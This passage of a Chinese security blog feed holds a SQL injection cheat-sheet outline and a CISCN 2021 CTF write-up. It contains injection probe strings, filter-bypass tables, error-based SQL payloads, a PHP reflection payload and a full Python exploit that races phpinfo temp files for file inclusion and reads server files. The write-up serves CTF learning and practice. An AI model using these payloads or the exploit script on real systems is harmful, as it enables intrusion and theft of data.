title="常用函数"></a>常用函数</h2><ol><li>version()——MySQL版本</li><li>user()——用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ol><p>最常用的一般是<code>database()</code>，有时候注意看<code>user()</code>，有些题目给的是root用户，需要用<code>load_file()</code>读文件，下面开始注入准备</p><hr><h2 id="测试注入"><a href="#测试注入" class="headerlink" title="测试注入"></a>测试注入</h2><table><thead><tr><th>测试字符串</th><th>变  种</th><th>预 期 结 果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’=’1</td><td>1’) or (‘1’=’1</td><td>永真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’=’2</td><td>value’) or (‘1’=’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’=’2</td><td>1’) and (‘1’=’2</td><td>永假条件。如果成功，将不返回表中任何行</td></tr><tr><td>1’ or ‘ab’=’a’+’b</td><td>1’) or (‘ab’=’a’+’b</td><td>SQL Server字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’ ‘b</td><td>1’) or (‘ab’=’a’ ‘b</td><td>MySQL字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’‖’b</td><td>1’) or (‘ab’=’a’‖’b</td><td>Oracle字符串连接。如果成功，将返回与永真条件相同的信息</td></tr></tbody></table><hr><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注，就是指执行sql语句后返回值不直接回显到前端页面</p><hr><h2 id="过滤情况"><a href="#过滤情况" class="headerlink" title="过滤情况"></a>过滤情况</h2><h3 id="过滤select"><a href="#过滤select" class="headerlink" title="过滤select"></a>过滤select</h3><p>比较劲爆，如果有回显可以报错注入查出简单信息</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token operator">and</span> <span class="token punctuation">(</span>extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#</span></code></pre><p><code>user()</code>/<code>database()</code>/<code>version()</code></p><ul><li>但这不行，可以利用堆叠注入绕过过滤</li></ul><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span>'<span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token comment">#</span></code></pre><p>然后利用预编译方式查数据</p><p>经典题目：<a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">2019强网杯-随便注</a></p><ul><li><p>或者<code>alter</code>改表名，然后万能密码登陆出结果(如果可回显的话)</p></li><li><p>据说web端过滤也许可以preg_match回溯限制(有的情况)</p></li><li><p>同表的话可以同表查询</p><p>盲注字段名利用<code>left(column,0)</code></p><p>当存在字段时返回True</p></li></ul><p>基本过滤</p><table><thead><tr><th align="center">过滤</th><th align="center">替代方法</th></tr></thead><tbody><tr><td align="center">and</td><td align="center">&amp;</td></tr><tr><td align="center">or</td><td align="center">|</td></tr><tr><td align="center">[空格]</td><td align="center">/**/或()或%0a</td></tr><tr><td align="center">#</td><td align="center">–+</td></tr><tr><td align="center">substr()</td><td align="center">mid()、substring()</td></tr><tr><td align="center">ascii()</td><td align="center">hex()、bin()、ord()</td></tr><tr><td align="center">sleep()</td><td align="center">benchmark()</td></tr><tr><td align="center">group_concat()</td><td align="center">concat_ws()</td></tr><tr><td align="center">&lt;、&gt;</td><td align="center">greatest()</td></tr><tr><td align="center">limit n,m</td><td align="center">limit m offset n</td></tr></tbody></table><table><thead><tr><th>测试字符串</th><th>变  种</th><th>预 期 结 果</th></tr></thead><tbody><tr><td>‘</td><td></td><td>触发错误。如果成功，数据库将返回一个错误</td></tr><tr><td>1’ or ‘1’=’1</td><td>1’) or (‘1’=’1</td><td>永真条件。如果成功，将返回表中所有的行</td></tr><tr><td>value’ or ‘1’=’2</td><td>value’) or (‘1’=’2</td><td>空条件。如果成功，将返回与原来的值相同的结果</td></tr><tr><td>1’ and ‘1’=’2</td><td>1’) and (‘1’=’2</td><td>永假条件。如果成功，将不返回表中任何行</td></tr><tr><td>1’ or ‘ab’=’a’+’b</td><td>1’) or (‘ab’=’a’+’b</td><td>SQL Server字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’ ‘b</td><td>1’) or (‘ab’=’a’ ‘b</td><td>MySQL字符串连接。如果成功，将返回与永真条件相同的信息</td></tr><tr><td>1’ or ‘ab’=’a’‖’b</td><td>1’) or (‘ab’=’a’‖’b</td><td>Oracle字符串连接。如果成功，将返回与永真条件相同的信息</td></tr></tbody></table><h2 id="移位溢注"><a href="#移位溢注" class="headerlink" title="移位溢注"></a>移位溢注</h2><p>知道表名不需要知道字段名，一般没用，能用的时候都能用其他的注出来。</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=&quot;SQL注入&quot;&gt;&lt;/a&gt;SQL注入&lt;/h1&gt;&lt;p&gt;小交流会的提纲，记录下，没有逻辑可言&lt;/p&gt;
&lt;p&gt;今年本人参加的CTF中记录</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2021CISCN-WP</title>
    <link href="https://err0r.top/article/ciscn2021/"/>
    <id>https://err0r.top/article/ciscn2021/</id>
    <published>2021-05-17T06:33:44.000Z</published>
    <updated>2021-05-17T07:22:14.606Z</updated>
    
    <content type="html"><![CDATA[<p>Ciscn 2021</p><p>队伍名称：S3C_2021</p><a id="more"></a><h2 id="队伍情况"><a href="#队伍情况" class="headerlink" title="队伍情况"></a>队伍情况</h2><p><del>本菜鸡太菜，不值一提，希望分区赛能冲刺，争取进入总决赛(删了)</del></p><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>sql注入，sqlmap跑</p><img src="/article/ciscn2021/image-20210515121550955.png" class="" title="image-20210515121550955" loading="lazy"><p>根据log得知库名security</p><img src="/article/ciscn2021/image-20210515121644530.png" class="" title="image-20210515121644530" loading="lazy"><p>表名users，flag</p><img src="/article/ciscn2021/image-20210515121704337.png" class="" title="image-20210515121704337" loading="lazy"><p>payload：</p><pre class="language-sql" data-language="sql"><code class="language-sql">uname<span class="token operator">=</span>'<span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">AND</span><span class="token operator">+</span>EXTRACTVALUE<span class="token punctuation">(</span><span class="token number">4078</span><span class="token punctuation">,</span>CONCAT<span class="token punctuation">(</span><span class="token number">0x5c</span><span class="token punctuation">,</span><span class="token number">0x717a7a7671</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">+</span><span class="token operator">*</span><span class="token operator">+</span><span class="token keyword">from</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token keyword">join</span><span class="token operator">+</span>flag<span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>b<span class="token operator">+</span><span class="token keyword">using</span><span class="token punctuation">(</span><span class="token keyword">no</span><span class="token punctuation">,</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">as</span><span class="token operator">+</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x717a6a7871</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre><p>同表查询得到列名id,no,200e6beb-a706-473f-add2-29e877c6ce25</p><p>最终</p><img src="/article/ciscn2021/1.jpg" class="" title="2ED72E0CF8ED07FBCB27F11F73A6187B" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;63zs0-zMP27-bhZDu-kIEv3-AvlHh-&#125;</code></pre><hr><h3 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h3><p>原题：<a href="https://r0yanx.com/2020/10/28/fslh-writeup/">https://r0yanx.com/2020/10/28/fslh-writeup/</a></p><p>扫目录发现<code>.index.php.swo</code></p><p>可以利用 PHP 内置类中的 <code>ReflectionMethod</code> 来读取 <code>User</code> 类里面各个函数的注释</p><p>payload：</p><pre class="language-none"><code class="language-none">.&#x2F;?rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</code></pre><img src="/article/ciscn2021/image-20210515124614970.png" class="" title="image-20210515124614970" loading="lazy"><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;Ak4Z6-6GU0a-fAz0n-OTdYy-KDq4Q-&#125;</code></pre><hr><h3 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h3><p>扫目录发现<code>.listing</code></p><p>访问得到<code>you_can_seeeeeeee_me.php</code>，给了phpinfo</p><p>根据源码发现</p><p><code>$_POST[&quot;field&quot;];</code>和<code>echo $$field;</code>有出入</p><p>根据vulhub一个利用phpinfo进行文件包含的漏洞，改一下exp直接打</p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md</a></p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> threading<span class="token keyword">import</span> socket<span class="token keyword">def</span> <span class="token function">setup</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>    TAG<span class="token operator">=</span><span class="token string">"Security Test"</span>    <span class="token comment"># PAYLOAD = """%s\r</span>    <span class="token comment"># &lt;?php var_dump(scandir('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/'));?>\r""" % TAG</span>    PAYLOAD<span class="token operator">=</span><span class="token triple-quoted-string string">"""%s\r&lt;?php var_dump(file_get_contents('/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g'));?>\r"""</span> <span class="token operator">%</span> TAG    REQ1_DATA<span class="token operator">=</span><span class="token triple-quoted-string string">"""-----------------------------7dbff1ded0714\rContent-Disposition: form-data; name="123"; filename="test.txt"\rContent-Type: text/plain\r\r%s-----------------------------7dbff1ded0714"""</span> <span class="token operator">%</span> PAYLOAD    padding<span class="token operator">=</span><span class="token string">"G"</span> <span class="token operator">*</span> <span class="token number">5000</span>    REQ1<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST /?a="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">""" HTTP/1.1\rCookie: PHPSESSID=1; othercookie="""</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT: """</span> <span class="token operator">+</span> padding <span class="token operator">+</span> <span class="token triple-quoted-string string">"""\rHTTP_USER_AGENT: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_ACCEPT_LANGUAGE: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rHTTP_PRAGMA: """</span><span class="token operator">+</span>padding<span class="token operator">+</span><span class="token triple-quoted-string string">"""\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\rContent-Length: %s\rHost: %s\r\r%s"""</span> <span class="token operator">%</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>REQ1_DATA<span class="token punctuation">)</span><span class="token punctuation">,</span>host<span class="token punctuation">,</span>REQ1_DATA<span class="token punctuation">)</span>    <span class="token comment">#modify this to suit the LFI script  </span>    LFIREQ<span class="token operator">=</span><span class="token triple-quoted-string string">"""POST / HTTP/1.1\rUser-Agent: Mozilla/4.0\rProxy-Connection: Keep-Alive\rHost: %s\rContent-Type: application/x-www-form-urlencodedContent-Length: %s\r\r%s"""</span>    <span class="token comment">#print(REQ1)</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>REQ1<span class="token punctuation">,</span> TAG<span class="token punctuation">,</span> LFIREQ<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">phpInfoLFI</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> lfireq<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s2 <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>    d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span> <span class="token operator">&lt;</span> offset<span class="token punctuation">:</span>        d <span class="token operator">+=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>offset<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> d<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>        fn <span class="token operator">=</span> d<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">17</span><span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">31</span><span class="token punctuation">]</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    fn<span class="token operator">=</span><span class="token string">"cf=../../../../../..&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span>    <span class="token comment">#print(fn)</span>    s2<span class="token punctuation">.</span>send<span class="token punctuation">(</span>lfireq <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">,</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span>    d <span class="token operator">=</span> s2<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    s2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span>tag<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span>        <span class="token keyword">return</span> fncounter<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">class</span> <span class="token class-name">ThreadWorker</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> e<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>event <span class="token operator">=</span> e        self<span class="token punctuation">.</span>lock <span class="token operator">=</span>  l        self<span class="token punctuation">.</span>maxattempts <span class="token operator">=</span> m        self<span class="token punctuation">.</span>args <span class="token operator">=</span> args    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> counter        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> self<span class="token punctuation">.</span>lock<span class="token punctuation">:</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> self<span class="token punctuation">.</span>maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">return</span>                counter<span class="token operator">+=</span><span class="token number">1</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                x <span class="token operator">=</span> phpInfoLFI<span class="token punctuation">(</span><span class="token operator">*</span>self<span class="token punctuation">.</span>args<span class="token punctuation">)</span>                <span class="token keyword">if</span> self<span class="token punctuation">.</span>event<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">break</span>                                <span class="token keyword">if</span> x<span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"\nGot it!"</span>                    self<span class="token punctuation">.</span>event<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                                <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">:</span>                <span class="token keyword">return</span>    <span class="token keyword">def</span> <span class="token function">getOffset</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> phpinforeq<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Gets offset of tmp_name in the php output"""</span>    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>phpinforeq<span class="token punctuation">)</span>        d <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>        d<span class="token operator">+=</span>i                <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token comment"># detect the final chunk</span>        <span class="token keyword">if</span> i<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"0\r\n\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    i <span class="token operator">=</span> d<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"[tmp_name] =&amp;gt; "</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No php tmp_name in phpinfo output"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"found %s at %i"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>d<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>    <span class="token comment"># padded up a bit</span>    <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token number">256</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LFI With PHPInfo()"</span>    <span class="token keyword">print</span> <span class="token string">"-="</span> <span class="token operator">*</span> <span class="token number">30</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Usage: %s host [port] [threads]"</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        host <span class="token operator">=</span> socket<span class="token punctuation">.</span>gethostbyname<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> socket<span class="token punctuation">.</span>error<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with hostname %s: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    port<span class="token operator">=</span><span class="token number">80</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with port %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        poolsz<span class="token operator">=</span><span class="token number">10</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        poolsz <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">,</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Error with poolsz %d: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Getting initial offset..."</span><span class="token punctuation">,</span>      reqphp<span class="token punctuation">,</span> tag<span class="token punctuation">,</span> reqlfi <span class="token operator">=</span> setup<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>    offset <span class="token operator">=</span> getOffset<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    maxattempts <span class="token operator">=</span> <span class="token number">1000</span>    e <span class="token operator">=</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">(</span><span class="token punctuation">)</span>    l <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> <span class="token string">"Spawning worker pool (%d)..."</span> <span class="token operator">%</span> poolsz    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>    tp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>poolsz<span class="token punctuation">)</span><span class="token punctuation">:</span>        tp<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ThreadWorker<span class="token punctuation">(</span>e<span class="token punctuation">,</span>l<span class="token punctuation">,</span>maxattempts<span class="token punctuation">,</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> reqphp<span class="token punctuation">,</span> offset<span class="token punctuation">,</span> reqlfi<span class="token punctuation">,</span> tag<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> e<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            <span class="token keyword">with</span> l<span class="token punctuation">:</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>write<span class="token punctuation">(</span> <span class="token string">"\r% 4d / % 4d"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>counter<span class="token punctuation">,</span> maxattempts<span class="token punctuation">)</span><span class="token punctuation">)</span>                sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> counter <span class="token operator">>=</span> maxattempts<span class="token punctuation">:</span>                    <span class="token keyword">break</span>        <span class="token keyword">print</span>        <span class="token keyword">if</span> e<span class="token punctuation">.</span>is_set<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"Woot!  \m/"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">":("</span>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"\nTelling threads to shutdown..."</span>        e<span class="token punctuation">.</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"Shuttin' down..."</span>    <span class="token keyword">for</span> t <span class="token keyword">in</span> tp<span class="token punctuation">:</span>        t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>跑出结果</p><img src="/article/ciscn2021/image-20210515181707458.png" class="" title="image-20210515181707458" loading="lazy"><img src="/article/ciscn2021/image-20210515182132566.png" class="" title="image-20210515182132566" loading="lazy"><img src="/article/ciscn2021/image-20210515182141809.png" class="" title="image-20210515182141809" loading="lazy"><img src="/article/ciscn2021/image-20210515182239294.png" class="" title="image-20210515182239294" loading="lazy"><img src="/article/ciscn2021/image-20210515182330338.png" class="" title="image-20210515182330338" loading="lazy"><img src="/article/ciscn2021/image-20210515182410646.png" class="" title="image-20210515182410646" loading="lazy"><img src="/article/ciscn2021/image-20210515183203380.png" class="" title="image-20210515183203380" loading="lazy"><p>flag位置：<code>/etc/ceffgbbgcd/chffbdjbag/cjdieddjcc/cajjfieifd/ajdfdccjdj/fl444444g</code></p><p>Flag:</p><pre class="language-none"><code class="language-none">CISCN&#123;BmLDI-8WFso-KZGN9-XObp3-sjSOf-&#125;</code></pre><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny traffic"></a>tiny traffic</h3><p>流量包分析</p><img 